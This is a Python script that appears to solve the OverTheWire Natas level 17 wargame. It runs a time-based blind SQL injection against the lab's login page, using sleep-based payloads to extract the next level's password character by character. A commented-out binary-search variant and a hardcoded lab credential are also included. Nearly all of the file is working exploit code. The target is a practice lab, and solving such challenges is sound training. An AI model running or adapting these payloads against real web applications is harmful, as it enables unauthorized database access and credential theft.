import requests
import base64
import time

passwd = ''
auth = 'Basic ' + base64.b64encode('natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

# for i in range(1,33):
	# st = 48
	# en = 122
	# while(True):
		# mid = (st + en) / 2
		# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(2),sleep(0))-- -'}
		# t = time.time()
		# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		# t = time.time() - t
		# print str(t)+" "+str(mid)
		# if t > 2:
			# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(2),sleep(0))-- -'}
			# t = time.time()
			# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
			# t = time.time() - t
			# if t > 2:
				# passwd += chr(mid)
				# print "Password: " + passwd
				# break
		# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(2),sleep(0))-- -'}
		# t = time.time()
		# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		# t = time.time() - t
		# if t > 2:
			# Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(2),sleep(0))-- -'}
			# t = time.time()
			# r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
			# t = time.time() - t
			# if t > 2:
				# st= mid + 1
			# else:
				# en = mid -1
		

exists = ''
chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"	
for c in chars:
	Data = {'username':'natas18" and password like binary "%'+ c +'%" and sleep(2)-- -'}
	t = time.time()
	r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
	t = time.time() - t
	if t > 2:
		Data = {'username':'natas18" and password like binary "%'+ c +'%" and sleep(2)-- -'}
		t = time.time()
		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		t = time.time() - t
		if t > 2:
			exists += c
			print exists
			
for i in range(0,32):
	for c in exists:
		Data = {'username':'natas18" and password like binary "'+ passwd + c +'%" and sleep(2)-- -'}
		t = time.time()
		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		t = time.time() - t
		if t > 2:
			Data = {'username':'natas18" and password like binary "'+ passwd + c +'%" and sleep(2)-- -'}
			t = time.time()
			r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
			t = time.time() - t
			if t > 2:
				passwd += c
				print passwd
				break
